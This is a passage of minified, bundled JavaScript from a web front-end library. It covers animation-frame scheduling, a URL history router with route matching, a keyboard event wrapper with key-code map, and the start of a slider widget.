in(n=i[t])||"setAttribute"in n&&(n.setAttribute(e,"return;"),"function"==typeof n[e])}},{}],240:[function(e,t,n){"use strict";var i=/^(webkit|moz|ms)/gi;t.exports=function(e){return"cssfloat"===e.toLowerCase()?"float":(i.test(e)&&(e="-"+e),e.replace(/([A-Z]+)([A-Z][a-z])/g,"$1-$2").replace(/([a-z\d])([A-Z])/g,"$1-$2").toLowerCase())}},{}],241:[function(e,t,n){"use strict";var i=/-([a-z])/g;t.exports=function(e){return"float"===e.toLowerCase()?"cssFloat":("Ms"===(e=e.replace(i,(function(e,t){return t.toUpperCase()}))).substr(0,2)&&(e="ms"+e.substring(2)),e)}},{}],242:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=function(){this._currentID=0};r.prototype.getNewID=function(){return this._currentID++,"raf:"+this._currentID},t.exports=i.share("ac-raf-emitter-id-generator:sharedRAFEmitterIDGeneratorInstance","1.0.3",r)},{"@marcom/ac-shared-instance":261}],243:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("@marcom/ac-raf-executor/sharedRAFExecutorInstance"),s=e("@marcom/ac-raf-emitter-id-generator/sharedRAFEmitterIDGeneratorInstance");function a(e){e=e||{},r.call(this),this.id=s.getNewID(),this.executor=e.executor||o,this._reset(),this._willRun=!1,this._didDestroy=!1}(i=a.prototype=Object.create(r.prototype)).run=function(){return this._willRun||(this._willRun=!0),this._subscribe()},i.cancel=function(){this._unsubscribe(),this._willRun&&(this._willRun=!1),this._reset()},i.destroy=function(){var e=this.willRun();return this.cancel(),this.executor=null,r.prototype.destroy.call(this),this._didDestroy=!0,e},i.willRun=function(){return this._willRun},i.isRunning=function(){return this._isRunning},i._subscribe=function(){return this.executor.subscribe(this)},i._unsubscribe=function(){return this.executor.unsubscribe(this)},i._onAnimationFrameStart=function(e){this._isRunning=!0,this._willRun=!1,this._didEmitFrameData||(this._didEmitFrameData=!0,this.trigger("start",e))},i._onAnimationFrameEnd=function(e){this._willRun||(this.trigger("stop",e),this._reset())},i._reset=function(){this._didEmitFrameData=!1,this._isRunning=!1},t.exports=a},{"@marcom/ac-event-emitter-micro":122,"@marcom/ac-raf-emitter-id-generator/sharedRAFEmitterIDGeneratorInstance":242,"@marcom/ac-raf-executor/sharedRAFExecutorInstance":254}],244:[function(e,t,n){"use strict";var i=e("./SingleCallRAFEmitter"),r=function(e){this.rafEmitter=new i,this.rafEmitter.on(e,this._onRAFExecuted.bind(this)),this.requestAnimationFrame=this.requestAnimationFrame.bind(this),this.cancelAnimationFrame=this.cancelAnimationFrame.bind(this),this._frameCallbacks=[],this._nextFrameCallbacks=[],this._currentFrameID=-1,this._cancelFrameIdx=-1,this._frameCallbackLength=0,this._nextFrameCallbacksLength=0,this._frameCallbackIteration=0},o=r.prototype;o.requestAnimationFrame=function(e){return this._currentFrameID=this.rafEmitter.run(),this._nextFrameCallbacks.push(this._currentFrameID,e),this._nextFrameCallbacksLength+=2,this._currentFrameID},o.cancelAnimationFrame=function(e){this._cancelFrameIdx=this._nextFrameCallbacks.indexOf(e),-1!==this._cancelFrameIdx&&(this._nextFrameCallbacks.splice(this._cancelFrameIdx,2),this._nextFrameCallbacksLength-=2,0===this._nextFrameCallbacksLength&&this.rafEmitter.cancel())},o._onRAFExecuted=function(e){for(this._frameCallbacks=this._nextFrameCallbacks,this._frameCallbackLength=this._nextFrameCallbacksLength,this._nextFrameCallbacks=[],this._nextFrameCallbacksLength=0,this._frameCallbackIteration=0;this._frameCallbackIteration<this._frameCallbackLength;this._frameCallbackIteration+=2)this._frameCallbacks[this._frameCallbackIteration+1](e.time,e)},t.exports=r},{"./SingleCallRAFEmitter":246}],245:[function(e,t,n){"use strict";var i=e("./RAFInterface"),r=function(){this.events={}},o=r.prototype;o.requestAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].requestAnimationFrame},o.cancelAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].cancelAnimationFrame},t.exports=new r},{"./RAFInterface":244}],246:[function(e,t,n){"use strict";var i=e("./RAFEmitter"),r=function(e){i.call(this,e)};(r.prototype=Object.create(i.prototype))._subscribe=function(){return this.executor.subscribe(this,!0)},t.exports=r},{"./RAFEmitter":243}],247:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.cancelAnimationFrame("draw")},{"./RAFInterfaceController":245}],248:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.cancelAnimationFrame("update")},{"./RAFInterfaceController":245}],249:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.requestAnimationFrame("draw")},{"./RAFInterfaceController":245}],250:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.requestAnimationFrame("update")},{"./RAFInterfaceController":245}],251:[function(e,t,n){Date.now||(Date.now=function(){return(new Date).getTime()})},{}],252:[function(e,t,n){e("../Date/now"),function(){if("performance"in window==0&&(window.performance={}),"now"in window.performance==0){var e=Date.now();performance.timing&&performance.timing.navigationStart&&(e=performance.timing.navigationStart),window.performance.now=function(){return Date.now()-e}}}()},{"../Date/now":251}],253:[function(e,t,n){"use strict";var i;function r(e){e=e||{},this._reset(),this._willRun=!1,this._totalSubscribeCount=-1,this._requestAnimationFrame=window.requestAnimationFrame,this._cancelAnimationFrame=window.cancelAnimationFrame,this._boundOnAnimationFrame=this._onAnimationFrame.bind(this),this._boundOnExternalAnimationFrame=this._onExternalAnimationFrame.bind(this)}e("@marcom/ac-polyfills/performance/now"),(i=r.prototype).subscribe=function(e,t){return this._totalSubscribeCount++,this._nextFrameSubscribers[e.id]||(t?this._nextFrameSubscribersOrder.unshift(e.id):this._nextFrameSubscribersOrder.push(e.id),this._nextFrameSubscribers[e.id]=e,this._nextFrameSubscriberArrayLength++,this._nextFrameSubscriberCount++,this._run()),this._totalSubscribeCount},i.unsubscribe=function(e){return!!this._nextFrameSubscribers[e.id]&&(this._nextFrameSubscribers[e.id]=null,this._nextFrameSubscriberCount--,0===this._nextFrameSubscriberCount&&this._cancel(),!0)},i.trigger=function(e,t){var n;for(n=0;n<this._subscriberArrayLength;n++)null!==this._subscribers[this._subscribersOrder[n]]&&!1===this._subscribers[this._subscribersOrder[n]]._didDestroy&&this._subscribers[this._subscribersOrder[n]].trigger(e,t)},i.destroy=function(){var e=this._cancel();return this._subscribers=null,this._subscribersOrder=null,this._nextFrameSubscribers=null,this._nextFrameSubscribersOrder=null,this._rafData=null,this._boundOnAnimationFrame=null,this._onExternalAnimationFrame=null,e},i.useExternalAnimationFrame=function(e){if("boolean"==typeof e){var t=this._isUsingExternalAnimationFrame;return e&&this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),!this._willRun||e||this._animationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),this._isUsingExternalAnimationFrame=e,e?this._boundOnExternalAnimationFrame:t||!1}},i._run=function(){if(!this._willRun)return this._willRun=!0,0===this.lastFrameTime&&(this.lastFrameTime=performance.now()),this._animationFrameActive=!0,this._isUsingExternalAnimationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),!0},i._cancel=function(){var e=!1;return this._animationFrameActive&&(this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),this._animationFrameActive=!1,this._willRun=!1,e=!0),this._isRunning||this._reset(),e},i._onSubscribersAnimationFrameStart=function(e){var t;for(t=0;t<this._subscriberArrayLength;t++)null!==this._subscribers[this._subscribersOrder[t]]&&!1===this._subscribers[this._subscribersOrder[t]]._didDestroy&&this._subscribers[this._subscribersOrder[t]]._onAnimationFrameStart(e)},i._onSubscribersAnimationFrameEnd=function(e){var t;for(t=0;t<this._subscriberArrayLength;t++)null!==this._subscribers[this._subscribersOrder[t]]&&!1===this._subscribers[this._subscribersOrder[t]]._didDestroy&&this._subscribers[this._subscribersOrder[t]]._onAnimationFrameEnd(e)},i._onAnimationFrame=function(e){this._subscribers=this._nextFrameSubscribers,this._subscribersOrder=this._nextFrameSubscribersOrder,this._subscriberArrayLength=this._nextFrameSubscriberArrayLength,this._subscriberCount=this._nextFrameSubscriberCount,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this._isRunning=!0,this._willRun=!1,this._didRequestNextRAF=!1,this._rafData.delta=e-this.lastFrameTime,this.lastFrameTime=e,this._rafData.fps=0,this._rafData.delta>=1e3&&(this._rafData.delta=0),0!==this._rafData.delta&&(this._rafData.fps=1e3/this._rafData.delta),this._rafData.time=e,this._rafData.naturalFps=this._rafData.fps,this._rafData.timeNow=Date.now(),this._onSubscribersAnimationFrameStart(this._rafData),this.trigger("update",this._rafData),this.trigger("external",this._rafData),this.trigger("draw",this._rafData),this._onSubscribersAnimationFrameEnd(this._rafData),this._willRun||this._reset()},i._onExternalAnimationFrame=function(e){this._isUsingExternalAnimationFrame&&this._onAnimationFrame(e)},i._reset=function(){this._rafData={time:0,delta:0,fps:0,naturalFps:0,timeNow:0},this._subscribers={},this._subscribersOrder=[],this._subscriberArrayLength=0,this._subscriberCount=0,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this._didEmitFrameData=!1,this._animationFrame=null,this._animationFrameActive=!1,this._isRunning=!1,this._shouldReset=!1,this.lastFrameTime=0},t.exports=r},{"@marcom/ac-polyfills/performance/now":252}],254:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=e("./RAFExecutor");t.exports=i.share("ac-raf-executor:sharedRAFExecutorInstance","2.0.1",r)},{"./RAFExecutor":253,"@marcom/ac-shared-instance":261}],255:[function(e,t,n){"use strict";t.exports={Router:e("./ac-router/Router"),History:e("./ac-router/History"),Routes:e("@marcom/ac-routes").Routes,Route:e("@marcom/ac-routes").Route}},{"./ac-router/History":256,"./ac-router/Router":257,"@marcom/ac-routes":258}],256:[function(e,t,n){"use strict";var i=e("@marcom/ac-object").create,r=e("@marcom/ac-dom-events"),o=e("@marcom/ac-event-emitter").EventEmitter;function s(e){e=e||{},this.history=window.history,this.rootStripper=/^\/+|\/+$/g,this.root=e.root||"/",this.root=("/"+this.root+"/").replace(this.rootStripper,"/");var t="boolean"!=typeof e.resolveInitialHash||e.resolveInitialHash;this._pushState="boolean"!=typeof e.pushState||e.pushState,this._hashChange=e.hashChange||!1,this._setUpdateVars(t),e.autoStart&&this.start()}var a=s.prototype=i(o.prototype);a._isRoot=function(e){return("/"+e+"/").replace(this.rootStripper,"/")===this.root},a._isPushStateSupported=function(){return this.history&&this.history.pushState},a._isHashChangeSupported=function(){return"onhashchange"in window},a._setUpdateVars=function(e){if(this._pushState&&this._isPushStateSupported())e&&this._hashChange&&-1!==window.location.href.indexOf("#")&&this.history.pushState({},document.title,window.location.href.replace("#","")),this._hashChange=!1;else{if(e&&this._pushState&&this._hashChange&&window.location.href.indexOf("#")<0){window.location.origin||(window.location.origin=window.location.protocol+"//"+window.location.hostname,window.location.origin+=window.location.port?":"+window.location.port:"");var t=window.location.href.substr(window.location.origin.length+this.root.length);if(t.length)return void(window.location=window.location.origin+this.root+"#"+t)}this._hashChange&&!this._isHashChangeSupported()&&(this._interval=50,this._iframe=document.createElement('<iframe src="javascript:0" tabindex="-1" style="display:none;">'),this._iframe=document.body.appendChild(this._iframe).contentWindow,this._iframe.document.open().close()),this._pushState=!1}},a._checkUrl=function(){var e=this._iframe.location.hash.substr(1);0===e.length&&(e="/"),this.fragment()!==e&&(window.location.hash="#"+e,this._ignoreHashChange=!1,this._handleHashChange())},a._handlePopState=function(e){this.trigger("popstate",{fragment:this.fragment()})},a._handleHashChange=function(e){this._ignoreHashChange?this._ignoreHashChange=!1:this.trigger("popstate",{fragment:this.fragment()})},a.canUpdate=function(){return this._pushState||this._hashChange},a.start=function(){return this.started||!this._pushState&&!this._hashChange||(this.started=!0,this._pushState?(this._handlePopState=this._handlePopState.bind(this),r.addEventListener(window,"popstate",this._handlePopState)):this._hashChange&&(this._isHashChangeSupported()?(this._handleHashChange=this._handleHashChange.bind(this),r.addEventListener(window,"hashchange",this._handleHashChange)):(this._iframe.location.hash=this.fragment(),this._checkUrl=this._checkUrl.bind(this),this._checkUrlInterval=setInterval(this._checkUrl,this._interval)))),this.started||!1},a.stop=function(){this.started&&(this.started=!1,this._pushState?r.removeEventListener(window,"popstate",this._handlePopState):this._hashChange&&(this._isHashChangeSupported()?r.removeEventListener(window,"hashchange",this._handleHashChange):this._checkUrlInterval&&(clearInterval(this._checkUrlInterval),this._checkUrlInterval=null)))},a.navigate=function(e,t){if(!this.started||!this.canUpdate())return!1;t=t||{};var n=((this._isRoot(e)?"":this.root)+e).replace(/([^:])(\/\/)/g,"$1/");return this._pushState?this.history.pushState(t,document.title,n):this._hashChange&&(this._ignoreHashChange=!0,window.location.hash="#"+e,this._isHashChangeSupported()||(this._iframe.document.open().close(),this._iframe.location.hash="#"+e)),!0},a.fragment=function(){var e="";return this._pushState?e=window.location.pathname.substr(this.root.length):this._hashChange&&(e=window.location.hash.substr(1)),""===e?"/":e},t.exports=s},{"@marcom/ac-dom-events":75,"@marcom/ac-event-emitter":124,"@marcom/ac-object":183}],257:[function(e,t,n){"use strict";var i=e("@marcom/ac-object").create,r=e("@marcom/ac-dom-emitter").DOMEmitter,o=e("./History"),s=(e("@marcom/ac-routes").Route,e("@marcom/ac-routes").Routes);function a(e){e=e||{},this._intercept=e.intercept||"[data-route]",this._interceptAttribute=e.attribute||"href",this._handleTrigger=this._handleTrigger.bind(this),this.intercept(this._intercept),this.history=e.history||new o({root:e.root,autoStart:e.autoStart,pushState:e.pushState,hashChange:e.hashChange,resolveInitialHash:e.resolveInitialHash}),s.call(this,e.routes),e.autoStart&&(this.history.started||this.history.start(),this.start())}var c=a.prototype=i(s.prototype);c._handleTrigger=function(e){if(this.started){var t=e.target.getAttribute(this._interceptAttribute);t&&(/^(http|https):\/\/+/.exec(t)&&"href"===this._interceptAttribute&&(t=t.substr(t.indexOf(this.history.root)+this.history.root.length)||"/"),this.navigate(t)&&e.preventDefault())}},c._handlePopstate=function(e){this.navigate(e.fragment,!0)},c.start=function(){this.started||(this.started=!0,this.history.start(),this._handlePopstate=this._handlePopstate.bind(this),this.history.on("popstate",this._handlePopstate),this.navigate(this.history.fragment(),!0))},c.stop=function(){this.started&&(this.started=!1,this.history.stop(),this.history.off("popstate",this._handlePopstate))},c.navigate=function(e,t){return this.history.fragment()!==e||t?!(e&&!t&&!this.history.navigate(e)||(this.match(e),0)):this.history.canUpdate()},c.intercept=function(e,t){new r(t||document.body).on("click",e,this._handleTrigger)},t.exports=a},{"./History":256,"@marcom/ac-dom-emitter":70,"@marcom/ac-object":183,"@marcom/ac-routes":258}],258:[function(e,t,n){"use strict";t.exports={Routes:e("./ac-routes/Routes"),Route:e("./ac-routes/Route")}},{"./ac-routes/Route":259,"./ac-routes/Routes":260}],259:[function(e,t,n){"use strict";function i(e,t,n,i,r){if(this.path=e,this.callback=t,this.context=n,this.greedy=i||!1,this.priority=r||0,"number"!=typeof this.priority)throw new Error("Priority must be a Number.");this.identifierPattern="([a-zA-Z0-9\\-\\_]+)",this.tokensRe=new RegExp(":"+this.identifierPattern,"g"),this.matcher=this._createRouteMatcher(e)}var r=i.prototype;r._createRouteMatcher=function(e){if(e&&e.exec)return{pattern:e};if("/"===e)return{pattern:/^\/$/};if("string"!=typeof e)throw new Error("path must be either a string or regex");var t=this._extractRouteTokens(e),n=e.replace(this.tokensRe,this.identifierPattern);return{pattern:new RegExp(n,"g"),routeTokens:t}},r._extractRouteTokens=function(e){var t=e.replace(this.tokensRe,":"+this.identifierPattern),n=new RegExp(t,"g").exec(e);return n&&n.length>1?n.slice(1):null},r.match=function(e){this.matcher.pattern.lastIndex=0;var t=this.matcher.pattern.exec(e);if(t){var n=t.length?t.slice(1):[],i=this.callback;if(i&&"function"==typeof i)return i.apply(this.context||this,n),!0}return!1},t.exports=i},{}],260:[function(e,t,n){"use strict";var i=e("./Route");function r(e){this._routes={},e&&this.addRoutes(e)}var o=r.prototype;o._getIndex=function(e,t,n){if(void 0!==this._routes[e])for(var i=this._routes[e].length;--i>-1;)if(this._routes[e][i].callback===t&&this._routes[e][i].context===n)return i;return-1},o.match=function(e){var t,n;for(t in this._routes)for(n=this._routes[t].length;--n>-1&&(!this._routes[t][n].match(e)||!this._routes[t][n].greedy););},o.add=function(e){if(void 0===this._routes[e.path])this._routes[e.path]=[e];else if(!this.get(e.path,e.callback,e.context)){var t,n=this._routes[e.path].length;if(n>0)for(t=0;t<n;++t)if(this._routes[e.path][t].priority>e.priority)return this._routes[e.path].splice(t,0,e),e;this._routes[e.path].push(e)}return e},o.remove=function(e){var t=this._getIndex(e.path,e.callback,e.context);return t>-1&&(this._routes[e.path].splice(t,1),e)},o.get=function(e,t,n){var i=this._getIndex(e,t,n);return i>-1&&this._routes[e][i]},o.createRoute=function(e,t,n,r,o){var s=new i(e,t,n,r,o);return this.add(s),s},o.addRoutes=function(e){if(!(e instanceof Array))throw new Error("routes must be an Array.");var t,n,i=e.length;for(t=0;t<i;++t)(n=e[t])&&"object"==typeof n&&this.add(n)},o.removeRoutes=function(e){if(!(e instanceof Array))throw new Error("routes must be an Array.");var t,n,i=e.length;for(t=0;t<i;++t)(n=e[t])&&"object"==typeof n&&this.remove(n)},o.getRoutes=function(e){return void 0===this._routes[e]?[]:this._routes[e]},t.exports=r},{"./Route":259}],261:[function(e,t,n){"use strict";t.exports={SharedInstance:e("./ac-shared-instance/SharedInstance")}},{"./ac-shared-instance/SharedInstance":262}],262:[function(e,t,n){"use strict";var i,r=window,o=r.AC,s=(i={},{get:function(e,t){var n=null;return i[e]&&i[e][t]&&(n=i[e][t]),n},set:function(e,t,n){return i[e]||(i[e]={}),i[e][t]="function"==typeof n?new n:n,i[e][t]},share:function(e,t,n){var i=this.get(e,t);return i||(i=this.set(e,t,n)),i},remove:function(e,t){var n=typeof t;if("string"!==n&&"number"!==n)i[e]&&(i[e]=null);else{if(!i[e]||!i[e][t])return;i[e][t]=null}}});o||(o=r.AC={}),o.SharedInstance||(o.SharedInstance=s),t.exports=o.SharedInstance},{}],263:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=e("@marcom/ac-dom-events/utils/addEventListener"),o=e("@marcom/ac-dom-events/utils/removeEventListener"),s=e("@marcom/ac-object/create"),a=e("./internal/KeyEvent"),c="keydown",l="keyup";function u(e){this._keysDown={},this._DOMKeyDown=this._DOMKeyDown.bind(this),this._DOMKeyUp=this._DOMKeyUp.bind(this),this._context=e||document,r(this._context,c,this._DOMKeyDown,!0),r(this._context,l,this._DOMKeyUp,!0),i.call(this)}var h=u.prototype=s(i.prototype);h.onDown=function(e,t){return this.on("keydown:"+e,t)},h.onceDown=function(e,t){return this.once("keydown:"+e,t)},h.offDown=function(e,t){return this.off("keydown:"+e,t)},h.onUp=function(e,t){return this.on("keyup:"+e,t)},h.onceUp=function(e,t){return this.once("keyup:"+e,t)},h.offUp=function(e,t){return this.off("keyup:"+e,t)},h.isDown=function(e){return e+="",this._keysDown[e]||!1},h.isUp=function(e){return!this.isDown(e)},h.destroy=function(){return o(this._context,c,this._DOMKeyDown,!0),o(this._context,l,this._DOMKeyUp,!0),this._keysDown=null,this._context=null,i.prototype.destroy.call(this),this},h._DOMKeyDown=function(e){var t=this._normalizeKeyboardEvent(e),n=t.keyCode+="";this._trackKeyDown(n),this.trigger("keydown:"+n,t)},h._DOMKeyUp=function(e){var t=this._normalizeKeyboardEvent(e),n=t.keyCode+="";this._trackKeyUp(n),this.trigger("keyup:"+n,t)},h._normalizeKeyboardEvent=function(e){return new a(e)},h._trackKeyUp=function(e){this._keysDown[e]&&(this._keysDown[e]=!1)},h._trackKeyDown=function(e){this._keysDown[e]||(this._keysDown[e]=!0)},t.exports=u},{"./internal/KeyEvent":264,"@marcom/ac-dom-events/utils/addEventListener":82,"@marcom/ac-dom-events/utils/removeEventListener":84,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-object/create":185}],264:[function(e,t,n){"use strict";var i=e("./keyCodeMap.js"),r=["keyLocation","keyIdentifier"];function o(e){var t;for(t in this.originalEvent=e,e)-1===r.indexOf(t)&&"function"!=typeof e[t]&&(this[t]=e[t]);this.keyCode||(this.keyCode=this._getKeyCode()),this.location=void 0!==this.originalEvent.location?this.originalEvent.location:this.originalEvent.keyLocation}o.prototype={preventDefault:function(){if("function"==typeof this.originalEvent.preventDefault)return this.originalEvent.preventDefault();this.originalEvent.returnValue=!1},stopPropagation:function(){return this.originalEvent.stopPropagation()},_getKeyCode:function(){return i[this.code]||-1}},t.exports=o},{"./keyCodeMap.js":265}],265:[function(e,t,n){"use strict";t.exports={Backspace:8,Tab:9,Enter:13,NumpadEnter:13,ShiftLeft:16,ShiftRight:16,ControlLeft:17,ControlRight:17,AltLeft:18,AltRight:18,CapsLock:20,Escape:27,PageUp:33,PageDown:34,End:35,Home:36,ArrowLeft:37,ArrowUp:38,ArrowRight:39,ArrowDown:40,Delete:46,Digit0:48,Digit1:49,Digit2:50,Digit3:51,Digit4:52,Digit5:53,Digit6:54,Digit7:55,Digit8:56,Digit9:57,KeyA:65,KeyB:66,KeyC:67,KeyD:68,KeyE:69,KeyF:70,KeyG:71,KeyH:72,KeyI:73,KeyJ:74,KeyK:75,KeyL:76,KeyM:77,KeyN:78,KeyO:79,KeyP:80,KeyQ:81,KeyR:82,KeyS:83,KeyT:84,KeyU:85,KeyV:86,KeyW:87,KeyX:88,KeyY:89,KeyZ:90,Numpad0:96,Numpad1:97,Numpad2:98,Numpad3:99,Numpad4:100,Numpad5:101,Numpad6:102,Numpad7:103,Numpad8:104,Numpad9:105,NumpadMultiply:106,NumpadAdd:107,NumpadSubtract:109,NumpadDecimal:110,NumpadDivide:111,NumpadEqual:187,Backquote:192,BracketLeft:219,BracketRight:221,Backslash:220,Semicolon:186,Quote:222,Space:32,Equal:187,Comma:188,Minus:189,Period:190,Slash:191}},{}],266:[function(e,t,n){"use strict";const i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=e("@marcom/dom-metrics"),o=e("@marcom/ac-keyboard/Keyboard"),s=e("./templates/slider.html"),a={num:37,string:"ArrowLeft"},c={num:39,string:"ArrowRight"},l={num:40,string:"ArrowDown"},u=[a,c,l,c],h=function(e){if(e.which)return e.which;for(var t=e.key?e.key:e.code,n=0,i=u.length;n<i;n++)if(u[n].string===t)return u[n].num;return-1},d={min:0,max:1,step:1,value:0,orientation:"horizontal",renderedPosition:!1,template:s,keyboardMaxStepPercentage:.05,keyboardStepMultiplier:1.25,containerClass:"ac-slider-container",grabbedClass:"ac-slider-grabbed"},p=Object.keys(d),f=function(e,t){this.options=Object.assign({},d,t),this.model=Object.create(this.options),this.el=e;var n=void 0!==this.options.keyboardContext?this.options.keyboardContext:this.el;null!==n&&(this._keyboard=new o(n),this._keyDown={}),e.classList.add(this.model.containerClass),e.innerHTML=this.model.template,i.call(this),this._initialize()},m=f.prototype=Object.create(i.prototype);m._addGrabClass=function(){this.el.classList.add(this.model.grabbedClass)},m._removeGrabClass=function(){this.el.classList.remove(this.model.grabbedClass)},m._addEventListeners=function(){this._addEventListener(this.el,"mousedown",this._onMouseDown),this._addEventListener(this.el,"touchstart",this._onTouchStart),this._addEventListener(this.el,"mouseover",this._onMouseOver),this._addEventListener(this.el,"mouseleave",this._onMouseLeave),this._keyboard&&("horizontal"===this.model.orientation?(this._keyboard.onDown(c.num,this.stepUp),this._keyboard.onDown(a.num,this.stepDown)):(this._keyboard.onDown(l.num,this.stepDown),this._keyboard.onDown(38,this.stepUp)))},m._addEventListener=function(e,t,n,i){e.addEventListener(t,n,i)},m._bindMethods=function(){this._addGrabClass=this._addGrabClass.bind(this),this._removeGrabClass=this._removeGrabClass.bind(this),this.stepDown=this.stepDown.bind(this),this.stepUp=this.stepUp.bind(this),this._triggerRelease=this._triggerRelease.bind(this),this._preventDefault=this._preventDefault.bind(this),this._onMouseDown=this._bindMethod(this._onMouseDown,this),this._onTouchStart=this._bindMethod(this._onTouchStart,this),this._onMouseOver=this._bindMethod(this._onMouseOver,this),this._onMouseLeave=this._bindMethod(this._onMouseLeave,this),this._onTouchEnd=this._bindMethod(this._onTouchEnd,this),this._onMouseUp=this._bindMethod(this._onMouseUp,this),this._onMouseMove=this._bindMethod(this._onMouseMove,this),this._onTouchMove=this._bindMethod(this._onTouchMove,this)},m._bindMethod=function(e,t){return e.bind(t)},m._correctValueMinMax=function(e,t,n){return e>n&&(e=n),e<t&&(e=t),e},m._calculateStepsToValue=function(e,t){return Math.abs(e-t)},m._calculateMaxSteps=function(e,t){return Math.abs(t-e)},m._calculateStepsEqualToPercentage=function(e,t){return e/100*t},m._calculateNextStepInRange=function(e,t,n,i){var r=this._calculateMaxSteps(t,n),o=this._calculateStepsToValue(e,t),s=t+Math.floor(r/i)*i;return Math.min(s,t+Math.round(o/i)*i)},m._dispatchEvent=function(e,t){e.dispatchEvent(new CustomEvent(t))},m.disableUserControls=function(){this._removeEventListeners()},m.enableUserControls=function(){this._addEventListeners()},m._getNextValue=function(e,t,n,i){return e=this._correctValueMinMax(e,t,n),"auto"!==i&&(e=this._calculateNextStepInRange(e,t,n,i)),e},m.getOrientation=function(){return this.model.orientation},m.getValue=function(){return this.model.value},m.getMin=function(){return this.model.min},m.getMax=function(){return this.model.max},m.getStep=function(){return this.model.step},m.getClientXValue=function(e,t){var n=this._getClientXFromEvent(e),i=null!==t?r.getDimensions(t||this.thumbElement):{width:0,height:0},o=r.getDimensions(this.runnableTrackElement),s=(n-this.runnableTrackElement.getBoundingClientRect().left-Math.round(i.width/2))/(o.width-i.width)*100,a=this._calculateMaxSteps(this.getMin(),this.getMax()),c=this._calculateStepsEqualToPercentage(s,a);return this.getMin()+c},m.getClientYValue=function(e){var t=this._getClientYFromEvent(e),n=r.getDimensions(this.thumbElement),i=r.getDimensions(this.runnableTrackElement),o=r.getViewportPosition(this.runnableTrackElement,this.model.renderedPosition),s=(i.height-n.height-(t-o.top-n.height/2))/(i.height-n.height)*100,a=this._calculateMaxSteps(this.model.min,this.model.max),c=this._calculateStepsEqualToPercentage(s,a);return this.model.min+c},m.getClientValue=function(e){return e=e.originalEvent||e,"horizontal"===this.model.orientation?this.getClientXValue(e):this.getClientYValue(e)},m._getClientXFromEvent=function(e){return e.touches?e.touches[0].clientX:e.clientX},m._getClientYFromEvent=function(e){return e.touches?e.touches[0].clientY:e.clientY},m._initialize=function(){this._setNodeReferences(),this.setValue(this.model.value),this._bindMethods(),this._addEventListeners()},m._onMouseLeave=function(){this._preventDocumentMouseUpDispatch=!1},m._onMouseDown=function(e){this._addGrabClass(),this._addEventListener(document,"mouseup",this._onMouseUp),this._addEventListener(document,"mousemove",this._onMouseMove);var t=this.getClientValue(e);this.trigger("grab",this.getValue()),this.setValue(t)},m._onMouseUp=function(){this._removeGrabClass(),this._removeEventListener(document,"mouseup",this._onMouseUp),this._removeEventListener(document,"mousemove",this._onMouseMove),this.trigger("release",this.getValue()),this._preventDocumentMouseUpDispatch||this._dispatchEvent(this.el,"mouseup")},m._onMouseOver=function(){this._preventDocumentMouseUpDispatch=!0},m._onTouchEnd=function(){this._removeGrabClass(),this._removeEventListener(document,"touchend",this._onTouchEnd),this._removeEventListener(document,"touchmove",this._onTouchMove),this.trigger("release",this.getValue()),this._preventDocumentMouseUpDispatch||this._dispatchEvent(this.el,"touchend")},m._onTouchStart=function(e){this._addGrabClass();var t=this.getClientValue(e);this._addEventListener(document,"touchend",this._onTouchEnd),this._addEventListener(document,"touchmove",this._onTouchMove,{passive:!1}),this.trigger("grab",this.getValue()),this.setValue(t)},m._onMouseMove=function(e){var t=this.getClientValue(e);this.setValue(t)},m._onTouchMove=function(e){e.preventDefault&&e.preventDefault();var t=this.getClientValue(e);this.setValue(t)},m._getElementOrientationOffsetValue=function(e,t){return"horizontal"===t?r.getDimensions(e).width:r.getDimensions(e).height},m._getAvailableRunnableTrack=function(e,t){return e-this._getElementOrientationOffsetValue(this.thumbElement,t)},m._getPercentageByValue=function(e,t){return(e=this._calculateStepsToValue(e,this.getMin()))/this._calculateMaxSteps(this.getMin(),this.getMax())*100},m._getPercentageOfRunnableTrack=function(e){var t=this.getOrientation(),n=this._getElementOrientationOffsetValue(this.runnableTrackElement,t),i=this._getAvailableRunnableTrack(n,t);return this._getPercentageByValue(e,this.getMax())/100*i/n*100},m._onChange=function(e){var t=this._getPercentageOfRunnableTrack(e);isNaN(t)||("horizontal"===this.getOrientation()?this.thumbElement.style.left=t+"%":this.thumbElement.style.bottom=t+"%",this.trigger("change",this.getValue()))},m._removeEventListeners=function(){this._removeEventListener(this.el,"mousedown",this._onMouseDown),this._removeEventListener(this.el,"touchstart",this._onTouchStart),this._removeEventListener(this.el,"mouseover",this._onMouseOver),this._removeEventListener(this.el,"mouseleave",this._onMouseLeave),this._removeEventListener(document,"touchend",this._onMouseUp)},m._removeEventListener=function(e,t,n){e.removeEventListener(t,n)},m._setNodeReferences=function(){this.runnableTrackElement=this.el.querySelector(".ac-slider-runnable-track"),this.thumbElement=this.el.querySelector(".ac-slider-thumb")},m.setOrientation=function(e){this._set("orientation",e)},m._triggerRelease=function(e){this._preventDefault(e),this.trigger("release",this.getValue()),this._keyDown[h(e)]=0},m._preventDefault=function(e){e.preventDefault(),e.stopPropagation()},m._step=function(e,t){this._preventDefault(e),this.el.focus();var 